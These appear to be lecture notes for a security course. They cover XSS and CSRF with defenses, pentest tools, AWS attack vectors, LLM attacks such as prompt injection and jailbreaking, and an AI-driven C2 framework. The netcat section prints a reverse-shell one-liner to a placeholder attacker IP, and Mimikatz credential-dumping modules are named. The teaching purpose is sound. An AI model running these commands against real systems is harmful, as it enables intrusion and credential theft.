# CIS 55 – Lecture 5 Notes
**Topics:** Web Attacks (OWASP Top 10, XSS, CSRF), Tools Revisited (Metasploit, Mimikatz, netcat), Cloud Fundamentals (AWS Security), LLM Security

---

## Course Logistics

- **Lab 5 due:** March 7 (Friday)
- **Quiz 5:** Open today from 12pm until Sunday
- **All previous labs and quizzes** can be submitted until March 7 (late penalty applies)
- **Final Project due:** March 7 — choose one of: Pentest Tool, Incident, or Bug Bounty Research & Responsible Disclosure
  - Presenters receive 20 bonus points

---

## 1. Hacker News – Weekly Roundup

- **CarGurus Breach:** Data breach affecting 12.5 million accounts — https://techcrunch.com/2026/02/24/cargurus-data-breach-affects-12-5-million-accounts
- **DJI Robovac Breach:** Vulnerability in DJI Romo allowing remote camera access via MQTT — https://www.theverge.com/tech/879088/dji-romo-hack-vulnerability-remote-control-camera-access-mqtt

---

## 2. Bug Bounty Programs

Current active bug bounty programs worth exploring:

- **Meesho.com** (valmo.in)
- **Expedia**
- **Airbnb**
- **Andruil Industries**
- **Coinbase**
- **Doordash**

---

## 3. Web Attacks

### OWASP Top 10

The **OWASP Top 10** is the definitive list of the most critical web application security risks. The list is updated periodically to reflect the evolving threat landscape.

| 2017 Ranking | 2021 Ranking |
|---|---|
| A01 – Injection | A01 – **Broken Access Control** (moved up) |
| A02 – Broken Authentication | A02 – Cryptographic Failures |
| A03 – Sensitive Data Exposure | A03 – Injection (moved down) |
| A04 – XML External Entities (XXE) | A04 – **Insecure Design** (NEW) |
| A05 – Broken Access Control | A05 – Security Misconfiguration |
| A06 – Security Misconfiguration | A06 – Vulnerable and Outdated Components |
| A07 – Cross-Site Scripting (XSS) | A07 – Identification and Authentication Failures |
| A08 – Insecure Deserialization | A08 – **Software and Data Integrity Failures** (NEW) |
| A09 – Using Components with Known Vulnerabilities | A09 – Security Logging and Monitoring Failures* |
| A10 – Insufficient Logging & Monitoring | A10 – **Server-Side Request Forgery (SSRF)*** (NEW) |

\* From survey data

**Key shifts from 2017→2021:**
- Broken Access Control jumped to #1 (was #5)
- Three new categories added: Insecure Design, Software and Data Integrity Failures, SSRF
- XSS merged into Injection category

**Practice target:** OWASP Juice Shop — https://owasp.org/www-project-juice-shop/

---

### Cross-Site Scripting (XSS)

XSS is one of the most common application-level attacks against web applications today.

**Definition:** XSS is an attack on the **privacy of clients** of a particular website. It can lead to a total breach of security when customer details are stolen or manipulated.

**Key characteristic:** Unlike most attacks (which involve two parties — attacker and website, or attacker and victim), XSS involves **three parties**:
1. The attacker
2. The victim client
3. The web site

**Goal of XSS:** Steal the client's **session cookies** or other sensitive information that identifies the client to the website. With the victim's session token, the attacker can impersonate the user — acting on their behalf in all interactions with the site.

> XSS is used for a client to attack **another client**, not to attack a server.

#### How XSS Works (Attack Flow)

```
1. User victim establishes session with Server victim
2. User victim visits Attack server (attacker's malicious site)
3. User victim receives malicious page from Attack server
4. User victim's browser sends forged request to Server victim
```

The attacker exploits the session that the legitimate user has already established with the trusted server.

---

#### Stored XSS

Stored XSS is the **more serious** variant of XSS.

- Instead of using a reflection bug (where malicious script is embedded in a URL), the attacker **stores JavaScript** in a place where victims are likely to read it — and thereby execute it
- It is the **server's responsibility** to sanitize user input before storing it
- **Example:** A public forum where users post comments — an attacker posts exploit code as a "comment" that executes in every reader's browser

**Why it's more serious:** A single successful injection infects every user who views the content, rather than requiring each victim to click a crafted link.

---

#### Defending Against XSS

| Defense | Description |
|---------|-------------|
| Create a session token on first visit | Ties the session to the initial browser |
| Destroy old session on authentication | When user logs in, invalidate the previous session and create a new one |
| Expire sessions after 30–60 minutes | Short session lifetimes limit the attacker's window |
| Destroy sessions after logout | Prevent reuse of stolen session tokens |
| Use SSL and mark cookies as `secure` | Prevent cookies from being sent over plain HTTP |
| Monitor `User-Agent` header | It should not change during a session — a change may indicate token theft |

---

### Cross-Site Request Forgery (CSRF)

**Definition:** CSRF occurs when a malicious website causes a user's browser to perform **unwanted actions** on a trusted website where the user is already authenticated.

**Examples of CSRF attacks:**
- Transfer money out of a user's bank account
- Harvest user IDs
- Compromise user accounts

#### Conditions Required for CSRF

All three conditions must be met for a CSRF attack to succeed:

1. **Implicit authentication** — The user must be capable of executing "unwanted" actions on the trusted website (i.e., have an active authenticated session)
2. **No user authorization check** — The trusted website checks only that a request came from an authenticated browser, not that the user themselves authorized the specific action
3. **Social engineering** — The user must be tricked into visiting the malicious website **during** their authenticated session with the trusted site

#### Does SSL Prevent CSRF?

**No.** SSL does not protect against CSRF. Here's why:

- The user's browser records session information the first time they connect to the trusted site
- Any subsequent requests from that browser are **automatically appended** with session information (username/password, cookies, or SSL certificates)
- The malicious site can exploit this implicit authentication — the browser helpfully includes session tokens with every request, regardless of which site triggered it
- A "surefire" fix would be requiring the user to explicitly authenticate every single request — but this makes browsers unusable in practice

#### Defending Against CSRF – Server-Side

| Defense | Description |
|---------|-------------|
| Restrict GET to read-only | GET requests should only retrieve data, never modify server state |
| Require pseudo-random token in POST | All state-changing requests must include a secret token unknown to the attacker |
| Server sets token as cookie | The trusted site generates a pseudo-random value R and sets it as a cookie on the user's browser |
| Validate form value == cookie value | A request is only accepted if the form field token matches the cookie token — the malicious site cannot read the cookie due to same-origin policy |

---

## 4. Tools Revisited

### Metasploit

Metasploit is a penetration testing framework used to develop, test, and execute exploits against remote targets.

- Available in Kali Linux (`msfconsole`)
- Modules: exploits, payloads, auxiliary, post-exploitation
- Provides a structured environment for managing attacks and sessions

### Mimikatz

Mimikatz is a post-exploitation Windows tool used to extract plaintext passwords, NTLM hashes, and Kerberos tickets from memory.

- Runs on Windows systems after gaining initial access
- Commonly used for **credential dumping** and **lateral movement**
- Requires elevated (SYSTEM/Admin) privileges
- Key modules: `sekurlsa::logonpasswords`, `lsadump::sam`

### Netcat (nc / ncat)

Netcat is a network utility for reading and writing data across TCP/UDP connections — often called the "Swiss Army knife" of networking.

- Available on Linux as `ncat` (Nmap project version)
- Common uses: port scanning, banner grabbing, reverse shells, file transfer, debugging

```bash
# Listen for incoming connection
nc -lvp 4444

# Connect to a listener (reverse shell)
nc <attacker-ip> 4444 -e /bin/bash

# Banner grabbing
nc <target-ip> 80
```

---

## 5. Cloud Fundamentals – AWS Security

AWS (Amazon Web Services) is the dominant cloud provider. Understanding AWS security is essential for modern pentesting and defense.

### Key AWS Security Concepts

| Service / Concept | Description |
|---|---|
| **IAM (Identity and Access Management)** | Controls who can access AWS services and what actions they can perform. Compromise of IAM = total cloud compromise |
| **S3 (Simple Storage Service)** | Object storage. Misconfigured S3 buckets (public read/write) are a frequent finding in pentests |
| **EC2 (Elastic Compute Cloud)** | Virtual machines in the cloud. Entry points via exposed SSH, RDP, or web services |
| **VPC (Virtual Private Cloud)** | Isolated network within AWS. Security groups act as virtual firewalls |
| **CloudTrail** | Audit logging for all AWS API calls — critical for detecting attacker activity |
| **Security Groups** | Stateful firewall rules attached to EC2 instances |

### Common AWS Attack Vectors

- **Exposed IAM credentials** in source code, environment variables, or S3 buckets
- **Overly permissive IAM roles** (e.g., `AdministratorAccess` on EC2 instance role)
- **Public S3 buckets** containing sensitive data
- **SSRF to metadata service** (169.254.169.254) — can leak IAM role credentials
- **Misconfigured security groups** exposing internal services to the internet

### AWS Shared Responsibility Model

- **AWS is responsible for:** Security *of* the cloud (infrastructure, physical, hypervisor)
- **Customer is responsible for:** Security *in* the cloud (data, IAM, OS patching, network config)

---

## 6. LLM Security

Large Language Models (LLMs) like ChatGPT, Claude, and Gemini introduce new attack surfaces.

### Key LLM Attack Types

| Attack | Description |
|--------|-------------|
| **Prompt Injection** | Attacker embeds instructions in user input to override the system prompt or hijack the model's behavior |
| **Indirect Prompt Injection** | Malicious instructions are placed in external content the LLM reads (web pages, documents, emails) |
| **Jailbreaking** | Techniques to bypass safety filters and get the model to produce restricted content |
| **Data Exfiltration via LLM** | Using a compromised LLM agent to leak data to an attacker-controlled destination |
| **Training Data Poisoning** | Injecting malicious data during training to introduce backdoors or biases |

### OWASP Top 10 for LLMs

OWASP has published a dedicated Top 10 for LLM applications:

1. Prompt Injection
2. Insecure Output Handling
3. Training Data Poisoning
4. Model Denial of Service
5. Supply Chain Vulnerabilities
6. Sensitive Information Disclosure
7. Insecure Plugin Design
8. Excessive Agency
9. Overreliance
10. Model Theft

### Defenses for LLM Applications

- **Input validation and sanitization** — treat LLM input as untrusted user data
- **Least-privilege for LLM agents** — limit what actions an LLM can take autonomously
- **Output validation** — don't pass raw LLM output to downstream systems (shells, SQL, HTML)
- **Human-in-the-loop** for high-impact actions taken by LLM agents
- **System prompt isolation** — separate system and user content; monitor for injection attempts

---

## 7. AI-Native C2 Frameworks – Villager (CyberSpike)

Traditional C2 frameworks like Cobalt Strike require operators to manually script attack sequences. A new generation of **AI-native C2 frameworks** removes that expertise barrier entirely.

**Villager** (by CyberSpike, released July 2025) is the most prominent example — 10,000+ PyPI downloads in its first months.

### How It Works

Instead of issuing manual commands, the operator submits a natural language goal:

> *"Find and exploit a foothold on 192.168.1.0/24"*

The AI (DeepSeek v3) automatically:
1. Decomposes the goal into subtasks with a dependency graph
2. Selects the right tools per target (WPScan for WordPress, sqlmap for SQL injection, nuclei for CVE scanning)
3. Executes attack chains in parallel
4. Recovers from failures by trying alternative paths

### Architecture

| Service | Port | Role |
|---------|------|------|
| MCP Client | 25989 | Message coordination |
| Kali Driver | 1611 | Containerized Kali attack nodes |
| Browser Automation | 8080 | Web/client-side exploitation |
| FastAPI C2 | 37695 | Task submission and agent control |

### Key Concern: Forensic Evasion

Each attack session runs inside a **Docker container that self-destructs after 24 hours**, wiping all logs, tool output, and shell history from the attack node. This means traditional endpoint-based forensics find nothing.

### Defensive Takeaways

- **Endpoint artifacts are gone** → shift to **network-based behavioral detection**
- Watch for rapid sequential tool signatures from one IP (nmap → nuclei → sqlmap in minutes)
- Alert on container registry pulls and unusual outbound connections to LLM API endpoints
- AI lowers the skill floor — expect more automated, adaptive attacks from less-skilled adversaries

---

## Reminders

- **Lab 5 due:** March 7 (Friday)
- **Quiz 5:** Open today from 12pm until Sunday
- **Final Project due:** March 7 — present for 20 bonus points
- All late submissions accepted until March 7 with late penalty
